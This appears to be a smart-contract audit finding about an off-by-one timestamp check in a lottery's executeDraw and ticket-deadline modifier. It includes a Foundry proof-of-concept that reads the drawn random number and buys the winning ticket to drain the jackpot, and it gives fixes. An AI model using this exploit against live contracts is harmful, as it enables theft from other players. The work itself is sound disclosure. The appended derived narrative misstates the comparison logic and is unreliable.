---
id: 18323
severity: "Medium"
---

# Possibility to steal jackpot bypassing restrictions in the `executeDraw`

## Description

Attacker can run `executeDraw()` in `Lottery.sol`, receive random numbers and _then_ buy tickets with known numbers in one block.

Harm: Jackpot
```solidity
function executeDraw() external override whenNotExecutingDraw {
    // slither-disable-next-line timestamp
    if (block.timestamp < drawScheduledAt(currentDraw)) { //@dingo should be <= here
        revert ExecutingDrawTooEarly();
    }
    returnUnclaimedJackpotToThePot();
    drawExecutionInProgress = true;
    requestRandomNumber();
    emit StartedExecutingDraw(currentDraw);
}
```
Also modifier in LotterySetup.sol allows same action:
```solidity
modifier beforeTicketRegistrationDeadline(uint128 drawId) {
    // slither-disable-next-line timestamp
    if (block.timestamp > ticketRegistrationDeadline(drawId)) { //@dingo should be >= here
        revert TicketRegistrationClosed(drawId);
    }
    _;
}
```

## Proof of Concept

This vulnerability is possible to use when contract has been deployed with COOL _DOWN_ PERIOD = 0;

The `executeDraw()` is allowed to be called at the last second of draw due to an incorrect comparison `block.timestamp` with `drawScheduledAt(currentDraw)`, which is start of draw.
```solidity
function executeDraw() external override whenNotExecutingDraw {
    // slither-disable-next-line timestamp
    if (block.timestamp < drawScheduledAt(currentDraw)) { //@dingo should be <= here
        revert ExecutingDrawTooEarly();
    }
    returnUnclaimedJackpotToThePot();
    drawExecutionInProgress = true;
    requestRandomNumber();
    emit StartedExecutingDraw(currentDraw);
}
```
Also modifier in LotterySetup.sol allows same action:
```solidity
modifier beforeTicketRegistrationDeadline(uint128 drawId) {
    // slither-disable-next-line timestamp
    if (block.timestamp > ticketRegistrationDeadline(drawId)) { //@dingo should be >= here
        revert TicketRegistrationClosed(drawId);
    }
    _;
}
```
Exploit:
Attacker is waiting for last second of `PERIOD` (between to draws).

Call `executeDraw()`. It will affect a `requestRandomNumber()` and chainlink will return random number to `onRandomNumberFulfilled()` at `RNSourceController.sol`.

Attacker now could read received RandomNumber:
```solidity
uint256 winningTicketTemp = lot.winningTicket(0);
```
Attacker buys new ticket with randomNumber:
```solidity
uint128[] memory drawId2 = new uint128[](1);
drawId2[0] = 0;
uint120[] memory winningArray = new uint120[](1);
winningArray[0] = uint120(winningTicketTemp); 
lot.buyTickets(drawId2, winningArray, address(0), address(0));
```
Claim winnings:
```solidity
uint256[] memory ticketID = new uint256[](1);
ticketID[0] = 1;
lot.claimWinningTickets(ticketID);
```
Exploit code:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./LotteryTestBase.sol";
import "../src/Lottery.sol";
import "./TestToken.sol";
import "test/TestHelpers.sol";

contract LotteryTestCustom is LotteryTestBase {
  address public eoa = address(1234);
  address public attacker = address(1235);

  function testExploit() public {
    vm.warp(0);
    Lottery lot = new Lottery(
      LotterySetupParams(
        rewardToken,
        LotteryDrawSchedule(2 * PERIOD, PERIOD, COOL_DOWN_PERIOD),
        TICKET_PRICE,
        SELECTION_SIZE,
        SELECTION_MAX,
        EXPECTED_PAYOUT,
        fixedRewards
      ),
      playerRewardFirstDraw,
      playerRewardDecrease,
      rewardsToReferrersPerDraw,
      MAX_RN_FAILED_ATTEMPTS,
      MAX_RN_REQUEST_DELAY
    );

    lot.initSource(IRNSource(randomNumberSource));

    vm.startPrank(eoa);
    rewardToken.mint(1000 ether);
    rewardToken.approve(address(lot), 100 ether);
    rewardToken.transfer(address(lot), 100 ether);
    vm.warp(60 * 60 * 24 + 1);
    lot.finalizeInitialPotRaise();

    uint128[] memory drawId = new uint128[](1);
    drawId[0] = 0;
    uint120[] memory ticketsDigits = new uint120[](1);
    ticketsDigits[0] = uint120(0x0F); //1,2,3,4 numbers choosed;

    ///@dev Origin user buying ticket.
    lot.buyTickets(drawId, ticketsDigits, address(0), address(0));
    vm.stopPrank();

    //====start of attack====
    vm.startPrank(attacker);
    rewardToken.mint(1000 ether);
    rewardToken.approve(address(lot), 100 ether);

    console.log("attacker balance before buying ticket:               ", rewardToken.balanceOf(attacker));

    vm.warp(172800); //Attacker is waiting for deadline of draw period, than he could call executeDraw();
    lot.executeDraw(); //Due to the lack of condition check in executeDraw(`<` should be `<=`). Also call was sent to chainlink.
    uint256 randomNumber = 0x00;
    vm.stopPrank();

    vm.prank(address(randomNumberSource));
    lot.onRandomNumberFulfilled(randomNumber); //chainLink push here randomNumber;
    uint256 winningTicketTemp = lot.winningTicket(0); //random number from chainlink stores here.
    console.log("Winning ticket number is:                            ", winningTicketTemp);

    vm.startPrank(attacker);
    uint128[] memory drawId2 = new uint128[](1);
    drawId2[0] = 0;
    uint120[] memory winningArray = new uint120[](1);
    winningArray[0] = uint120(winningTicketTemp); // @audit we will buy ticket with stealed random number below;

    lot.buyTickets(drawId2, winningArray, address(0), address(0)); //attacker can buy ticket with stealed random number.

    uint256[] memory ticketID = new uint256[](1);
    ticketID[0] = 1;
    lot.claimWinningTickets(ticketID); //attacker claims winninngs.
    vm.stopPrank();

    console.log("attacker balance after all:                          ", rewardToken.balanceOf(attacker));
  }

  function reconstructTicket(
    uint256 randomNumber,
    uint8 selectionSize,
    uint8 selectionMax
  ) internal pure returns (uint120 ticket) {
    /// Ticket must contain unique numbers, so we are using smaller selection count in each iteration
    /// It basically means that, once `x` numbers are selected our choice is smaller for `x` numbers
    uint8[] memory numbers = new uint8[](selectionSize);
    uint256 currentSelectionCount = uint256(selectionMax);

    for (uint256 i = 0; i < selectionSize; ++i) {
      numbers[i] = uint8(randomNumber % currentSelectionCount);
      randomNumber /= currentSelectionCount;
      currentSelectionCount--;
    }

    bool[] memory selected = new bool[](selectionMax);

    for (uint256 i = 0; i < selectionSize; ++i) {
      uint8 currentNumber = numbers[i];
      // check current selection for numbers smaller than current and increase if needed
      for (uint256 j = 0; j <= currentNumber; ++j) {
        if (selected[j]) {
          currentNumber++;
        }
      }
      selected[currentNumber] = true;
      ticket |= ((uint120(1) << currentNumber));
    }
  }
}
```

## Recommendation

1. Change `<` by `<=`:
```solidity
function executeDraw() external override whenNotExecutingDraw {
    // slither-disable-next-line timestamp
    if (block.timestamp <= drawScheduledAt(currentDraw)) {
        revert ExecutingDrawTooEarly();
    }
    returnUnclaimedJackpotToThePot();
    drawExecutionInProgress = true;
    requestRandomNumber();
    emit StartedExecutingDraw(currentDraw);
}
```
2. Change `>` by `>=`:
```solidity
modifier beforeTicketRegistrationDeadline(uint128 drawId) {
    // slither-disable-next-line timestamp
    if (block.timestamp >= ticketRegistrationDeadline(drawId)) {
        revert TicketRegistrationClosed(drawId);
    }
    _;
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an off‑by‑one error in the time‑based restrictions that govern when a lottery draw can be executed and when tickets may be purchased. The contract’s executeDraw function checks that the current block timestamp is strictly less than the scheduled draw start (block.timestamp < drawScheduledAt(currentDraw)). Because the comparison uses a strict “<”, the function can still be called at the exact moment the draw is scheduled, which should be prohibited. A similar mistake exists in the beforeTicketRegistrationDeadline modifier, which uses a strict “>” to reject ticket purchases after the registration deadline, allowing purchases when the timestamp is exactly equal to the deadline. When the cool‑down period between draws is set to zero, these boundary conditions line up so that an attacker can call executeDraw at the last second of the draw period, trigger a request for a random number, receive the random number in the same block (or immediately via the Chainlink callback), read the winning ticket value, and then purchase a ticket with that exact number before the contract’s deadline check blocks the action. After buying the ticket, the attacker can immediately call claimWinningTickets and collect the entire jackpot. The exploit works because the contract assumes the random number is unpredictable and that ticket purchases are impossible once the draw has started, both of which are invalidated by the faulty comparisons. The impact is that the jackpot can be drained by a single malicious participant, causing other users to lose expected winnings and reducing confidence in the protocol’s fairness. The issue manifests only when the draw schedule allows a zero‑length cool‑down period and when an attacker can synchronize actions within the same block, making it difficult to detect in ordinary testing that does not cover exact‑timestamp edge cases. The bug belongs to the class of boundary‑condition timestamp comparison flaws that create race‑condition‑like opportunities. To remediate, the executeDraw check should be changed to block.timestamp <= drawScheduledAt(currentDraw) and the deadline modifier should use block.timestamp >= ticketRegistrationDeadline(drawId), thereby preventing execution or ticket purchase at the exact boundary and closing the window for the described attack.
